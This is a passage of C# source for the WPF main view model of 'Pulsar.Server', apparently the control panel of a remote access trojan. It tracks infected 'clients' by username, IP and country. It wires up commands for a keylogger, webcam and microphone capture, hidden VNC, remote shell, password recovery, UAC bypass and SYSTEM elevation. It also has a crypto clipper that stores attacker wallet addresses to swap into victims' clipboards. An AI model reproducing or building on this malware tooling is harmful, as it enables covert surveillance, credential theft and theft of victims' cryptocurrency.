using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Data;
using System.Windows.Input;
using System.Windows.Threading;
using Newtonsoft.Json;
using Pulsar.Common.Messages.ClientManagement;
using Pulsar.Common.Messages.ClientManagement.UAC;
using Pulsar.Common.Messages.Other;
using Pulsar.Server.Forms;
using Pulsar.Server.Networking;
using Pulsar.Server.Operations;
using Pulsar.Server.Persistence;
using Pulsar.Server.Services.Wpf;
using Pulsar.Server.Statistics;

namespace Pulsar.Server.ViewModels
{
    /// <summary>
    /// Execution feedback state for action buttons and the operation feedback banner.
    /// </summary>
    public enum ActionExecutionState
    {
        Ready,
        Processing,
        Success,
        Error
    }

    /// <summary>
    /// Event arguments carrying refreshed statistics and geo-map snapshots for the WPF Stats/HeatMap tabs.
    /// </summary>
    public sealed class AnalyticsSnapshotsEventArgs : EventArgs
    {
        public ClientStatisticsSnapshot Statistics { get; }
        public ClientGeoSnapshot Geo { get; }

        public AnalyticsSnapshotsEventArgs(ClientStatisticsSnapshot statistics, ClientGeoSnapshot geo)
        {
            Statistics = statistics;
            Geo = geo;
        }
    }

    /// <summary>
    /// Per-action visual feedback state bound to each button's Tag so buttons display
    /// independent processing, success, and error indicators without interfering with each other.
    /// </summary>
    public sealed class ActionFeedbackViewModel : INotifyPropertyChanged, IDisposable
    {
        private readonly Action<Action> _dispatch;
        private readonly object _sync = new object();
        private CancellationTokenSource _resetCts;
        private ActionExecutionState _state = ActionExecutionState.Ready;
        private string _statusMessage = string.Empty;
        private bool _disposed;

        public ActionFeedbackViewModel(Action<Action> dispatch)
        {
            _dispatch = dispatch ?? (action => action());
        }

        public ActionExecutionState State
        {
            get => _state;
            private set
            {
                if (_state != value)
                {
                    _state = value;
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(IsBusy));
                }
            }
        }

        public string StatusMessage
        {
            get => _statusMessage;
            private set
            {
                if (_statusMessage != value)
                {
                    _statusMessage = value;
                    OnPropertyChanged();
                }
            }
        }

        public bool IsBusy => State == ActionExecutionState.Processing;

        public void SetProcessing(string message = "Executing...")
        {
            CancelPendingReset();
            UpdateState(ActionExecutionState.Processing, message);
        }

        public void SetSuccess(string message, int resetDelayMs = 1400)
        {
            UpdateState(ActionExecutionState.Success, message);
            ScheduleReset(resetDelayMs);
        }

        public void SetError(string message, int resetDelayMs = 2400)
        {
            UpdateState(ActionExecutionState.Error, message);
            ScheduleReset(resetDelayMs);
        }

        public void Reset()
        {
            CancelPendingReset();
            UpdateState(ActionExecutionState.Ready, string.Empty);
        }

        private void UpdateState(ActionExecutionState state, string message)
        {
            if (_disposed)
            {
                return;
            }

            _dispatch(() =>
            {
                if (_disposed)
                {
                    return;
                }

                State = state;
                StatusMessage = message ?? string.Empty;
            });
        }

        private void ScheduleReset(int delayMs)
        {
            if (delayMs <= 0 || _disposed)
            {
                return;
            }

            CancellationToken token;
            lock (_sync)
            {
                _resetCts?.Cancel();
                _resetCts?.Dispose();
                _resetCts = new CancellationTokenSource();
                token = _resetCts.Token;
            }

            _ = Task.Run(async () =>
            {
                try
                {
                    await Task.Delay(delayMs, token).ConfigureAwait(false);
                    if (!token.IsCancellationRequested && !_disposed)
                    {
                        UpdateState(ActionExecutionState.Ready, string.Empty);
                    }
                }
                catch (OperationCanceledException)
                {
                }
                catch (ObjectDisposedException)
                {
                }
            }, CancellationToken.None);
        }

        private void CancelPendingReset()
        {
            lock (_sync)
            {
                if (_resetCts != null)
                {
                    try { _resetCts.Cancel(); } catch { }
                    try { _resetCts.Dispose(); } catch { }
                    _resetCts = null;
                }
            }
        }

        public void Dispose()
        {
            _disposed = true;
            CancelPendingReset();
        }

        public event PropertyChangedEventHandler PropertyChanged;

        private void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }

    /// <summary>
    /// ViewModel for PulsarMainWindow (WPF port of FrmMain).
    /// Implements MVVM dashboard state, live client filtering, validated ClientOperationService
    /// system control commands, risk-tiered confirmations, context &amp; top-level menus,
    /// tool/window launchers, analytics snapshots, and tab persistence (Notifications, Crypto, Auto Tasks).
    /// </summary>
    public class MainViewModel : INotifyPropertyChanged, IDisposable
    {
        private const int MaxDebugLogEntries = 200;
        private const int MaxNotificationEntries = 500;

        private readonly Action<Action> _uiDispatch;
        private readonly IClientDialogService _dialogService;
        private readonly IClientToolLauncher _toolLauncher;
        private readonly IServerWindowLauncher _serverWindowLauncher;
        private readonly Action<string> _clipboardSetter;
        private readonly string _dataDirectory;
        private readonly HashSet<ClientOperation> _sessionSuppressedConfirmations = new HashSet<ClientOperation>();
        private readonly List<ActionFeedbackViewModel> _allFeedbackStates = new List<ActionFeedbackViewModel>();

        private PulsarServer _listenServer;
        private ClientOperationService _clientOperations;
        private Client _selectedClient;
        private OfflineClientRecord _selectedOfflineClient;
        private NotificationEntry _selectedNotification;
        private AutoTask _selectedAutoTask;
        private ObservableCollection<Client> _onlineClients;
        private ICollectionView _onlineClientsView;
        private ObservableCollection<OfflineClientRecord> _offlineClients;
        private ObservableCollection<NotificationEntry> _notifications;
        private ObservableCollection<AutoTask> _autoTasks;
        private ObservableCollection<string> _debugLogs;
        private string _searchQuery = string.Empty;
        private string _listeningStatus;
        private int _connectedClientCount;
        private int _filteredClientCount;
        private int _selectedTabIndex;
        private bool _isLoading;
        private bool _isListening;
        private bool _disablePreview;
        private string _feedbackBannerText = string.Empty;
        private ActionExecutionState _feedbackBannerState = ActionExecutionState.Ready;
        private bool _isDarkTheme = true;

        // Crypto Clipper fields
        private string _bitcoinAddress = string.Empty;
        private string _ethereumAddress = string.Empty;
        private string _litecoinAddress = string.Empty;
        private string _moneroAddress = string.Empty;
        private string _solanaAddress = string.Empty;
        private string _dashAddress = string.Empty;
        private string _xrpAddress = string.Empty;
        private string _tronAddress = string.Empty;
        private string _bitcoinCashAddress = string.Empty;
        private bool _cryptoClipperEnabled;

        private bool _disposed;

        public event EventHandler<AnalyticsSnapshotsEventArgs> AnalyticsSnapshotsUpdated;

        /// <summary>
        /// Initializes a new instance of MainViewModel with optional service and dispatcher overrides.
        /// </summary>
        public MainViewModel(
            PulsarServer listenServer = null,
            ClientOperationService clientOperationService = null,
            IClientDialogService dialogService = null,
            IClientToolLauncher toolLauncher = null,
            Action<Action> uiDispatcher = null,
            IServerWindowLauncher serverWindowLauncher = null,
            string dataDirectory = null,
            Action<string> clipboardSetter = null)
        {
            _listenServer = listenServer;
            _uiDispatch = uiDispatcher ?? CreateDefaultDispatcher();
            _dialogService = dialogService ?? new WpfClientDialogService();
            _toolLauncher = toolLauncher ?? new WinFormsClientToolLauncher();
            _serverWindowLauncher = serverWindowLauncher ?? new WinFormsServerWindowLauncher();
            _clipboardSetter = clipboardSetter ?? (text => Clipboard.SetText(text));
            _dataDirectory = string.IsNullOrWhiteSpace(dataDirectory)
                ? Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "PulsarStuff")
                : dataDirectory;

            _onlineClients = new ObservableCollection<Client>();
            _onlineClients.CollectionChanged += (_, __) => UpdateClientCounts();
            _onlineClientsView = CreateOnlineClientsView(_onlineClients);

            _offlineClients = new ObservableCollection<OfflineClientRecord>();
            _notifications = new ObservableCollection<NotificationEntry>();
            _notifications.CollectionChanged += (_, __) => OnPropertyChanged(nameof(NotificationStatusText));
            _autoTasks = new ObservableCollection<AutoTask>();
            _debugLogs = new ObservableCollection<string>();
            _listeningStatus = "Not listening.";
            _connectedClientCount = 0;
            _filteredClientCount = 0;
            _isLoading = false;
            _isListening = false;
            _isDarkTheme = ThemeService.Instance.CurrentTheme == ThemeService.Theme.Dark;

            _clientOperations = clientOperationService ?? new ClientOperationService(GetManagedClientsSnapshot, AppendAuditLog);

            InitializeFeedbackStates();
            InitializeCommands();
            LoadPersistedTabState();

            ThemeService.Instance.ThemeChanged += OnThemeChanged;

            if (_listenServer != null)
            {
                WireUpServerEvents();
                RefreshClientLists();
            }
        }

        private string CryptoAddressesFilePath => Path.Combine(_dataDirectory, "crypto_addresses.json");
        private string AutoTasksFilePath => Path.Combine(_dataDirectory, "autotasks.json");
        private string NotificationsFilePath => Path.Combine(_dataDirectory, "notifications.json");

        private static Action<Action> CreateDefaultDispatcher()
        {
            var captured = Application.Current?.Dispatcher ?? Dispatcher.FromThread(Thread.CurrentThread);
            return action =>
            {
                if (action == null)
                {
                    return;
                }

                var dispatcher = Application.Current?.Dispatcher ?? captured;
                if (dispatcher == null || dispatcher.CheckAccess())
                {
                    action();
                }
                else
                {
                    dispatcher.Invoke(action);
                }
            };
        }

        private ICollectionView CreateOnlineClientsView(ObservableCollection<Client> source)
        {
            var view = CollectionViewSource.GetDefaultView(source);
            if (view != null)
            {
                view.Filter = FilterOnlineClient;
            }
            return view;
        }

        private bool FilterOnlineClient(object item)
        {
            if (item is not Client client)
            {
                return false;
            }

            if (string.IsNullOrWhiteSpace(_searchQuery))
            {
                return true;
            }

            return FrmMain.MainShellSearchMatches(
                _searchQuery,
                new[]
                {
                    client.Value?.Username,
                    client.Value?.PcName,
                    client.Value?.UserAtPc,
                    client.Value?.PublicIP,
                    client.EndPoint?.ToString(),
                    client.Value?.Country,
                    client.Value?.CountryCode,
                    client.Value?.OperatingSystem,
                    client.Value?.Tag,
                    client.Value?.Version,
                    client.Value?.Id
                });
        }

        private void UpdateClientCounts()
        {
            ConnectedClientCount = _onlineClients?.Count ?? 0;
            if (_onlineClientsView != null)
            {
                _onlineClientsView.Refresh();
                FilteredClientCount = _onlineClientsView.Cast<object>().Count();
            }
            else
            {
                FilteredClientCount = ConnectedClientCount;
            }

            OnPropertyChanged(nameof(ClientsHeaderText));
        }

        private Client[] GetManagedClientsSnapshot()
        {
            if (_listenServer != null)
            {
                return _listenServer.ConnectedClients;
            }

            return _onlineClients?.ToArray() ?? Array.Empty<Client>();
        }

        private void InitializeFeedbackStates()
        {
            DisconnectFeedback = RegisterFeedback();
            ReconnectFeedback = RegisterFeedback();
            RestartFeedback = RegisterFeedback();
            ShutdownFeedback = RegisterFeedback();
            StandbyFeedback = RegisterFeedback();
            LockscreenFeedback = RegisterFeedback();
            MessageBoxFeedback = RegisterFeedback();
            ExecuteCommandFeedback = RegisterFeedback();
            UninstallFeedback = RegisterFeedback();

            QuickMicrophoneFeedback = RegisterFeedback();
            QuickRemoteDesktopFeedback = RegisterFeedback();
            QuickWebcamFeedback = RegisterFeedback();
            QuickKeyloggerFeedback = RegisterFeedback();
            QuickFileManagerFeedback = RegisterFeedback();
            QuickRemoteShellFeedback = RegisterFeedback();
            QuickRemoteExecutionFeedback = RegisterFeedback();
            QuickHvncFeedback = RegisterFeedback();
        }

        private ActionFeedbackViewModel RegisterFeedback()
        {
            var feedback = new ActionFeedbackViewModel(_uiDispatch);
            _allFeedbackStates.Add(feedback);
            return feedback;
        }

        private void OnThemeChanged(object sender, ThemeChangedEventArgs e)
        {
            _uiDispatch(() => IsDarkTheme = e.NewTheme == ThemeService.Theme.Dark);
        }

        private void WireUpServerEvents()
        {
            if (_listenServer == null)
            {
                return;
            }

            _listenServer.ClientConnected += OnServerClientConnected;
            _listenServer.ClientDisconnected += OnServerClientDisconnected;
            UpdateListeningStatus();
        }

        private void UnwireServerEvents()
        {
            if (_listenServer == null)
            {
                return;
            }

            _listenServer.ClientConnected -= OnServerClientConnected;
            _listenServer.ClientDisconnected -= OnServerClientDisconnected;
        }

        private void OnServerClientConnected(Client client)
        {
            if (client == null)
            {
                return;
            }

            _uiDispatch(() =>
            {
                if (!OnlineClients.Contains(client))
                {
                    OnlineClients.Add(client);
                }

                UpdateClientCounts();
                AppendAuditLog($"Client connected: {FormatClientDisplay(client)} ({client.EndPoint})", "info");
                RefreshAnalyticsSnapshots();
            });
        }

        private void OnServerClientDisconnected(Client client)
        {
            if (client == null)
            {
                return;
            }

            _uiDispatch(() =>
            {
                OnlineClients.Remove(client);
                UpdateClientCounts();
                AppendAuditLog($"Client disconnected: {FormatClientDisplay(client)}", "warning");

                if (SelectedClient == client)
                {
                    SelectedClient = null;
                }

                RefreshAnalyticsSnapshots();
            });
        }

        public void RefreshClientLists()
        {
            _uiDispatch(() =>
            {
                try
                {
                    if (_listenServer != null)
                    {
                        OnlineClients.Clear();
                        foreach (var client in _listenServer.ConnectedClients)
                        {
                            if (client != null && client.Identified)
                            {
                                OnlineClients.Add(client);
                            }
                        }
                    }

                    UpdateClientCounts();
                    ReloadOfflineClients();
                    UpdateListeningStatus();
                    RefreshAnalyticsSnapshots();
                }
                catch (Exception ex)
                {
                    AppendAuditLog($"Error refreshing client lists: {ex.Message}", "error");
                }
            });
        }

        private void ReloadOfflineClients()
        {
            try
            {
                OfflineClients.Clear();
                var offlineRecords = OfflineClientRepository.GetAllClients();
                foreach (var record in offlineRecords)
                {
                    OfflineClients.Add(record);
                }
            }
            catch (Exception ex)
            {
                AppendAuditLog($"Error loading offline clients: {ex.Message}", "error");
            }
        }

        /// <summary>
        /// Builds fresh statistics and geo snapshots from persisted and live client records
        /// and notifies attached WPF StatsView / HeatMapView hosts.
        /// </summary>
        public (ClientStatisticsSnapshot Stats, ClientGeoSnapshot Geo) RefreshAnalyticsSnapshots()
        {
            var records = BuildCombinedAnalyticsRecords();
            var stats = ClientStatisticsService.CreateSnapshot(records);
            var geo = ClientGeoStatisticsService.CreateSnapshot(records);
            AnalyticsSnapshotsUpdated?.Invoke(this, new AnalyticsSnapshotsEventArgs(stats, geo));
            return (stats, geo);
        }

        private IReadOnlyList<OfflineClientRecord> BuildCombinedAnalyticsRecords()
        {
            var byId = new Dictionary<string, OfflineClientRecord>(StringComparer.OrdinalIgnoreCase);

            foreach (var offline in OfflineClients)
            {
                if (offline != null && !string.IsNullOrWhiteSpace(offline.ClientId))
                {
                    byId[offline.ClientId] = offline;
                }
            }

            foreach (var live in OnlineClients)
            {
                if (live?.Value == null)
                {
                    continue;
                }

                string id = !string.IsNullOrWhiteSpace(live.Value.Id)
                    ? live.Value.Id
                    : live.EndPoint?.ToString() ?? Guid.NewGuid().ToString("N");

                byId[id] = new OfflineClientRecord
                {
                    ClientId = id,
                    Username = live.Value.Username,
                    PcName = live.Value.PcName,
                    UserAtPc = live.Value.UserAtPc,
                    PublicIP = live.Value.PublicIP,
                    Country = live.Value.Country,
                    CountryCode = live.Value.CountryCode,
                    OperatingSystem = live.Value.OperatingSystem,
                    Version = live.Value.Version,
                    Tag = live.Value.Tag,
                    AccountType = live.Value.AccountType,
                    FirstSeenUtc = live.ConnectedTime == default ? DateTime.UtcNow : live.ConnectedTime,
                    LastSeenUtc = DateTime.UtcNow,
                    IsOnline = live.Connected
                };
            }

            return byId.Values.ToList();
        }

        private void UpdateListeningStatus()
        {
            if (_listenServer == null)
            {
                ListeningStatus = "Not listening.";
                IsListening = false;
                return;
            }

            try
            {
                var ports = _listenServer.GetListeningPorts() ?? Array.Empty<ushort>();
                ListeningStatus = FrmMain.ResolveListeningStatus(_listenServer.Listening, ports);
                IsListening = _listenServer.Listening;
            }
            catch (Exception ex)
            {
                System.Diagnostics.Debug.WriteLine($"Error updating listening status: {ex.Message}");
                ListeningStatus = "Status unavailable";
                IsListening = false;
            }
        }

        /// <summary>
        /// Sets the PulsarServer reference (for late binding).
        /// </summary>
        public void SetServer(PulsarServer server)
        {
            UnwireServerEvents();
            _listenServer = server;

            if (_listenServer != null)
            {
                WireUpServerEvents();
                RefreshClientLists();
            }
            else
            {
                _uiDispatch(() =>
                {
                    OnlineClients.Clear();
                    OfflineClients.Clear();
                    SelectedClient = null;
                    ListeningStatus = "Not listening.";
                    IsListening = false;
                    UpdateClientCounts();
                    RefreshAnalyticsSnapshots();
                });
            }
        }

        #region Core Properties

        public Client SelectedClient
        {
            get => _selectedClient;
            set
            {
                if (_selectedClient != value)
                {
                    _selectedClient = value;
                    OnPropertyChanged();
                    NotifySelectedClientDetailsChanged();
                    RefreshCommandStates();
                }
            }
        }

        public OfflineClientRecord SelectedOfflineClient
        {
            get => _selectedOfflineClient;
            set
            {
                if (_selectedOfflineClient != value)
                {
                    _selectedOfflineClient = value;
                    OnPropertyChanged();
                    DeleteSelectedOfflineClientCommand?.RaiseCanExecuteChanged();
                }
            }
        }

        public NotificationEntry SelectedNotification
        {
            get => _selectedNotification;
            set
            {
                if (_selectedNotification != value)
                {
                    _selectedNotification = value;
                    OnPropertyChanged();
                    ClearSelectedNotificationCommand?.RaiseCanExecuteChanged();
                }
            }
        }

        public AutoTask SelectedAutoTask
        {
            get => _selectedAutoTask;
            set
            {
                if (_selectedAutoTask != value)
                {
                    _selectedAutoTask = value;
                    OnPropertyChanged();
                    DeleteSelectedAutoTaskCommand?.RaiseCanExecuteChanged();
                }
            }
        }

        public ObservableCollection<Client> OnlineClients
        {
            get => _onlineClients;
            set
            {
                if (_onlineClients != value)
                {
                    _onlineClients = value ?? new ObservableCollection<Client>();
                    _onlineClients.CollectionChanged += (_, __) => UpdateClientCounts();
                    _onlineClientsView = CreateOnlineClientsView(_onlineClients);
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(OnlineClientsView));
                    UpdateClientCounts();
                }
            }
        }

        public ICollectionView OnlineClientsView => _onlineClientsView;

        public string SearchQuery
        {
            get => _searchQuery;
            set
            {
                var normalized = value ?? string.Empty;
                if (!string.Equals(_searchQuery, normalized, StringComparison.Ordinal))
                {
                    _searchQuery = normalized;
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(HasSearchQuery));
                    UpdateClientCounts();
                    ClearSearchCommand?.RaiseCanExecuteChanged();
                }
            }
        }

        public bool HasSearchQuery => !string.IsNullOrWhiteSpace(_searchQuery);

        public string ClientsHeaderText => HasSearchQuery
            ? $"Connected Clients ({FilteredClientCount} of {ConnectedClientCount} matching)"
            : $"Connected Clients ({ConnectedClientCount})";

        public ObservableCollection<OfflineClientRecord> OfflineClients
        {
            get => _offlineClients;
            set
            {
                if (_offlineClients != value)
                {
                    _offlineClients = value;
                    OnPropertyChanged();
                }
            }
        }

        public ObservableCollection<NotificationEntry> Notifications
        {
            get => _notifications;
            set
            {
                if (_notifications != value)
                {
                    _notifications = value;
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(NotificationStatusText));
                }
            }
        }

        public string NotificationStatusText
        {
            get
            {
                int total = _notifications?.Count ?? 0;
                int unread = _notifications?.Count(n => n != null && !n.IsRead) ?? 0;
                return FrmMain.ResolveNotificationStatusText(unread, total);
            }
        }

        public ObservableCollection<AutoTask> AutoTasks
        {
            get => _autoTasks;
            set
            {
                if (_autoTasks != value)
                {
                    _autoTasks = value;
                    OnPropertyChanged();
                }
            }
        }

        public ObservableCollection<string> DebugLogs
        {
            get => _debugLogs;
            set
            {
                if (_debugLogs != value)
                {
                    _debugLogs = value;
                    OnPropertyChanged();
                }
            }
        }

        public int SelectedTabIndex
        {
            get => _selectedTabIndex;
            set
            {
                if (_selectedTabIndex != value && value >= 0 && value <= 6)
                {
                    _selectedTabIndex = value;
                    OnPropertyChanged();

                    if (value == 1 || value == 3)
                    {
                        RefreshAnalyticsSnapshots();
                    }
                }
            }
        }

        public string ListeningStatus
        {
            get => _listeningStatus;
            set
            {
                if (_listeningStatus != value)
                {
                    _listeningStatus = value;
                    OnPropertyChanged();
                }
            }
        }

        public int ConnectedClientCount
        {
            get => _connectedClientCount;
            set
            {
                if (_connectedClientCount != value)
                {
                    _connectedClientCount = value;
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(ClientsHeaderText));
                }
            }
        }

        public int FilteredClientCount
        {
            get => _filteredClientCount;
            private set
            {
                if (_filteredClientCount != value)
                {
                    _filteredClientCount = value;
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(ClientsHeaderText));
                }
            }
        }

        public bool IsLoading
        {
            get => _isLoading;
            set
            {
                if (_isLoading != value)
                {
                    _isLoading = value;
                    OnPropertyChanged();
                }
            }
        }

        public bool IsListening
        {
            get => _isListening;
            set
            {
                if (_isListening != value)
                {
                    _isListening = value;
                    OnPropertyChanged();
                }
            }
        }

        public bool DisablePreview
        {
            get => _disablePreview;
            set
            {
                if (_disablePreview != value)
                {
                    _disablePreview = value;
                    OnPropertyChanged();
                }
            }
        }

        public bool IsDarkTheme
        {
            get => _isDarkTheme;
            private set
            {
                if (_isDarkTheme != value)
                {
                    _isDarkTheme = value;
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(ThemeToggleLabel));
                }
            }
        }

        public string ThemeToggleLabel => IsDarkTheme ? "☀ Light Theme" : "🌙 Dark Theme";

        public string FeedbackBannerText
        {
            get => _feedbackBannerText;
            private set
            {
                if (_feedbackBannerText != value)
                {
                    _feedbackBannerText = value;
                    OnPropertyChanged();
                    OnPropertyChanged(nameof(HasFeedbackBanner));
                }
            }
        }

        public ActionExecutionState FeedbackBannerState
        {
            get => _feedbackBannerState;
            private set
            {
                if (_feedbackBannerState != value)
                {
                    _feedbackBannerState = value;
                    OnPropertyChanged();
                }
            }
        }

        public bool HasFeedbackBanner => !string.IsNullOrWhiteSpace(FeedbackBannerText);

        #endregion

        #region Crypto Clipper Properties

        public string BitcoinAddress { get => _bitcoinAddress; set { if (_bitcoinAddress != value) { _bitcoinAddress = value ?? string.Empty; OnPropertyChanged(); } } }
        public string EthereumAddress { get => _ethereumAddress; set { if (_ethereumAddress != value) { _ethereumAddress = value ?? string.Empty; OnPropertyChanged(); } } }
        public string LitecoinAddress { get => _litecoinAddress; set { if (_litecoinAddress != value) { _litecoinAddress = value ?? string.Empty; OnPropertyChanged(); } } }
        public string MoneroAddress { get => _moneroAddress; set { if (_moneroAddress != value) { _moneroAddress = value ?? string.Empty; OnPropertyChanged(); } } }
        public string SolanaAddress { get => _solanaAddress; set { if (_solanaAddress != value) { _solanaAddress = value ?? string.Empty; OnPropertyChanged(); } } }
        public string DashAddress { get => _dashAddress; set { if (_dashAddress != value) { _dashAddress = value ?? string.Empty; OnPropertyChanged(); } } }
        public string XrpAddress { get => _xrpAddress; set { if (_xrpAddress != value) { _xrpAddress = value ?? string.Empty; OnPropertyChanged(); } } }
        public string TronAddress { get => _tronAddress; set { if (_tronAddress != value) { _tronAddress = value ?? string.Empty; OnPropertyChanged(); } } }
        public string BitcoinCashAddress { get => _bitcoinCashAddress; set { if (_bitcoinCashAddress != value) { _bitcoinCashAddress = value ?? string.Empty; OnPropertyChanged(); } } }

        public bool CryptoClipperEnabled
        {
            get => _cryptoClipperEnabled;
            set
            {
                if (_cryptoClipperEnabled != value)
                {
                    _cryptoClipperEnabled = value;
                    OnPropertyChanged();
                }
            }
        }

        #endregion

        #region Selected Client Projection (Real Client / UserState Properties Only)

        public bool HasSelectedClient => SelectedClient != null;
        public bool SelectedClientIsOnline => SelectedClient?.Connected == true;
        public bool SelectedClientIsIdentified => SelectedClient?.Identified == true;

        public string SelectedClientUsername =>
            !string.IsNullOrWhiteSpace(SelectedClient?.Value?.Username) ? SelectedClient.Value.Username : "—";

        public string SelectedClientHostname =>
            !string.IsNullOrWhiteSpace(SelectedClient?.Value?.PcName) ? SelectedClient.Value.PcName : "—";

        public string SelectedClientPublicIp =>
            !string.IsNullOrWhiteSpace(SelectedClient?.Value?.PublicIP) ? SelectedClient.Value.PublicIP : "—";

        public string SelectedClientEndpoint =>
            SelectedClient?.EndPoint != null ? SelectedClient.EndPoint.ToString() : "—";

        public string SelectedClientCountry =>
            !string.IsNullOrWhiteSpace(SelectedClient?.Value?.CountryWithCode) &&
            !string.Equals(SelectedClient.Value.CountryWithCode.Trim(), "[]", StringComparison.Ordinal)
                ? SelectedClient.Value.CountryWithCode
                : (!string.IsNullOrWhiteSpace(SelectedClient?.Value?.Country) ? SelectedClient.Value.Country : "—");

        public string SelectedClientAccountType =>
            !string.IsNullOrWhiteSpace(SelectedClient?.Value?.AccountType) ? SelectedClient.Value.AccountType : "—";

        public string SelectedClientOperatingSystem =>
            !string.IsNullOrWhiteSpace(SelectedClient?.Value?.OperatingSystem) ? SelectedClient.Value.OperatingSystem : "—";

        public string SelectedClientVersion =>
            !string.IsNullOrWhiteSpace(SelectedClient?.Value?.Version) ? SelectedClient.Value.Version : "—";

        public string SelectedClientTag =>
            !string.IsNullOrWhiteSpace(SelectedClient?.Value?.Tag) ? SelectedClient.Value.Tag : "—";

        public string SelectedClientId =>
            !string.IsNullOrWhiteSpace(SelectedClient?.Value?.Id) ? SelectedClient.Value.Id : "—";

        public string SelectedClientIdShort
        {
            get
            {
                var id = SelectedClient?.Value?.Id;
                if (string.IsNullOrWhiteSpace(id))
                {
                    return "—";
                }

                return id.Length > 12 ? id.Substring(0, 12) + "…" : id;
            }
        }

        public string SelectedClientConnectedSince
        {
            get
            {
                if (SelectedClient == null || SelectedClient.ConnectedTime == default)
                {
                    return "—";
                }

                var elapsed = DateTime.UtcNow - SelectedClient.ConnectedTime;
                if (elapsed < TimeSpan.Zero)
                {
                    elapsed = TimeSpan.Zero;
                }

                string duration = elapsed.TotalHours >= 1
                    ? $"{(int)elapsed.TotalHours}h {elapsed.Minutes}m"
                    : elapsed.TotalMinutes >= 1
                        ? $"{elapsed.Minutes}m {elapsed.Seconds}s"
                        : $"{elapsed.Seconds}s";

                return $"{SelectedClient.ConnectedTime.ToLocalTime():HH:mm:ss} ({duration})";
            }
        }

        public string SelectedClientStatusText =>
            SelectedClient == null ? "No Selection" : (SelectedClient.Connected ? "Online" : "Offline");

        public string SelectedClientIdentifiedText =>
            SelectedClient == null ? "—" : (SelectedClient.Identified ? "Verified" : "Pending");

        private void NotifySelectedClientDetailsChanged()
        {
            OnPropertyChanged(nameof(HasSelectedClient));
            OnPropertyChanged(nameof(SelectedClientIsOnline));
            OnPropertyChanged(nameof(SelectedClientIsIdentified));
            OnPropertyChanged(nameof(SelectedClientUsername));
            OnPropertyChanged(nameof(SelectedClientHostname));
            OnPropertyChanged(nameof(SelectedClientPublicIp));
            OnPropertyChanged(nameof(SelectedClientEndpoint));
            OnPropertyChanged(nameof(SelectedClientCountry));
            OnPropertyChanged(nameof(SelectedClientAccountType));
            OnPropertyChanged(nameof(SelectedClientOperatingSystem));
            OnPropertyChanged(nameof(SelectedClientVersion));
            OnPropertyChanged(nameof(SelectedClientTag));
            OnPropertyChanged(nameof(SelectedClientId));
            OnPropertyChanged(nameof(SelectedClientIdShort));
            OnPropertyChanged(nameof(SelectedClientConnectedSince));
            OnPropertyChanged(nameof(SelectedClientStatusText));
            OnPropertyChanged(nameof(SelectedClientIdentifiedText));
        }

        #endregion

        #region Per-Action Feedback ViewModels

        public ActionFeedbackViewModel DisconnectFeedback { get; private set; }
        public ActionFeedbackViewModel ReconnectFeedback { get; private set; }
        public ActionFeedbackViewModel RestartFeedback { get; private set; }
        public ActionFeedbackViewModel ShutdownFeedback { get; private set; }
        public ActionFeedbackViewModel StandbyFeedback { get; private set; }
        public ActionFeedbackViewModel LockscreenFeedback { get; private set; }
        public ActionFeedbackViewModel MessageBoxFeedback { get; private set; }
        public ActionFeedbackViewModel ExecuteCommandFeedback { get; private set; }
        public ActionFeedbackViewModel UninstallFeedback { get; private set; }

        public ActionFeedbackViewModel QuickMicrophoneFeedback { get; private set; }
        public ActionFeedbackViewModel QuickRemoteDesktopFeedback { get; private set; }
        public ActionFeedbackViewModel QuickWebcamFeedback { get; private set; }
        public ActionFeedbackViewModel QuickKeyloggerFeedback { get; private set; }
        public ActionFeedbackViewModel QuickFileManagerFeedback { get; private set; }
        public ActionFeedbackViewModel QuickRemoteShellFeedback { get; private set; }
        public ActionFeedbackViewModel QuickRemoteExecutionFeedback { get; private set; }
        public ActionFeedbackViewModel QuickHvncFeedback { get; private set; }

        #endregion

        #region Commands

        // System Control Commands (9 validated ClientOperationService operations)
        public RelayCommand DisconnectCommand { get; private set; }
        public RelayCommand ReconnectCommand { get; private set; }
        public RelayCommand RestartCommand { get; private set; }
        public RelayCommand ShutdownCommand { get; private set; }
        public RelayCommand StandbyCommand { get; private set; }
        public RelayCommand LockscreenCommand { get; private set; }
        public RelayCommand ShowMessageBoxCommand { get; private set; }
        public RelayCommand ExecuteCommandCommand { get; private set; }
        public RelayCommand UninstallCommand { get; private set; }

        // Tool Launch Commands (Quick Access 8 + compatibility alias)
        public RelayCommand QuickMicrophoneCommand { get; private set; }
        public RelayCommand QuickRemoteDesktopCommand { get; private set; }
        public RelayCommand QuickWebcamCommand { get; private set; }
        public RelayCommand QuickKeyloggerCommand { get; private set; }
        public RelayCommand QuickFileManagerCommand { get; private set; }
        public RelayCommand QuickRemoteShellCommand { get; private set; }
        public RelayCommand QuickFileExplorerCommand { get; private set; }
        public RelayCommand QuickRemoteExecutionCommand { get; private set; }
        public RelayCommand QuickHvncCommand { get; private set; }

        // Additional Administration / Monitoring Module Commands (Menus & Context Menu)
        public RelayCommand OpenSystemInfoCommand { get; private set; }
        public RelayCommand OpenTaskManagerCommand { get; private set; }
        public RelayCommand OpenStartupManagerCommand { get; private set; }
        public RelayCommand OpenRegistryEditorCommand { get; private set; }
        public RelayCommand OpenTcpConnectionsCommand { get; private set; }
        public RelayCommand OpenReverseProxyCommand { get; private set; }
        public RelayCommand OpenPasswordRecoveryCommand { get; private set; }
        public RelayCommand OpenSystemAudioCommand { get; private set; }
        public RelayCommand OpenRemoteChatCommand { get; private set; }

        // Client Maintenance & Elevation Commands
        public RelayCommand DeleteTempDirectoryCommand { get; private set; }
        public RelayCommand AskElevateCommand { get; private set; }
        public RelayCommand UacBypassCommand { get; private set; }
        public RelayCommand ElevateSystemCommand { get; private set; }
        public RelayCommand DeElevateCommand { get; private set; }

        // Clipboard Copy Commands
        public RelayCommand CopyClientIpCommand { get; private set; }
